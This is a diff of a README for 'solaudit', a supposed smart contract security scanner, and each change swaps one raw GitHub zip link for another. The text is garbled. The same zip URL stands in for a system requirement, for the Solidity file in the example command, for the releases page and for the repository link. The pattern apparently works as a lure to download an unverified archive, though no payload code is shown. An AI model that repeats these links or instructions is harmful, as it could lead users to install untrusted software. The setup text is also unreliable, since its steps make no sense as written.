@@ -1,7 +1,7 @@
 # 🔍 solaudit - Your Smart Contract Security Scanner
 
 ## 📥 Download Now!
-[![Download solaudit](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip)](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip)
+[![Download solaudit](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip)](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run solaudit effectively, your system should meet the following requirements:
   - macOS 10.14 or later
   - Linux (Ubuntu 18.04 or later)
 
-- **https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip**
+- **https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip**
   - Version 12.0 or later
 
 - **Memory:**
@@ -34,7 +34,7 @@ To run solaudit effectively, your system should meet the following requirements:
 
 ### 1. Visit the Releases Page
 
-To download solaudit, [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip). Here, you will find the latest version of the tool along with older versions if needed.
+To download solaudit, [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip). Here, you will find the latest version of the tool along with older versions if needed.
 
 ### 2. Download the Application
 
@@ -72,10 +72,10 @@ Press Enter.
 Now you can run solaudit by typing the command followed by your Solidity file. For example:
 
 ```bash
-node solaudit https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip
+node solaudit https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip
 ```
 
-Replace `https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip` with the name of your actual Solidity file.
+Replace `https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip` with the name of your actual Solidity file.
 
 ### 7. Review the Output
 
@@ -107,6 +107,6 @@ If you encounter issues or have questions, feel free to reach out through the re
 
 ## 🌐 Explore More
 
-For more information about updated features, versions, and ongoing developments, regularly check our [GitHub repository](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip).
+For more information about updated features, versions, and ongoing developments, regularly check our [GitHub repository](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip).
 
-To download solaudit again, just [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software-1.7-alpha.4.zip).
+To download solaudit again, just [visit this page to download](https://raw.githubusercontent.com/NguyenMinhGitHub/solaudit/main/src/Software_3.1-alpha.1.zip).
